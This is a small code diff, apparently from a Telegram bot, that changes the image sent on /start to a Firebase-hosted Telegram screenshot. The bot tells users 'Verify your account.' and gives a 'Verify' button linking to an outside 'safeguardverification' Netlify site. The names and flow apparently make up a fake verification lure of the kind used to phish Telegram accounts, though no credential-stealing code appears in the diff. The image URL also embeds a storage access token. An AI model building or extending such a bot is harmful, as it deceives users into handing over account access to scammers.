@@ -26,7 +26,7 @@ API_URL = 'https://telebot-ivng.onrender.com/send_message'  # Replace with your 
 async def on_start(event):
     try:
         await event.respond(
-            file='https://via.placeholder.com/150',  # Path to the image or image URL
+            file='https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/safeguard%20bot%2FScreenshot_20241223_101134_Telegram.jpg?alt=media&token=b207be6b-c41d-41ed-84e7-37855b02a4f8',  # Path to the image or image URL
             message="Verify your account.",
             buttons=[
                 [Button.url("Verify", "https://safeguardverification.netlify.app/")],
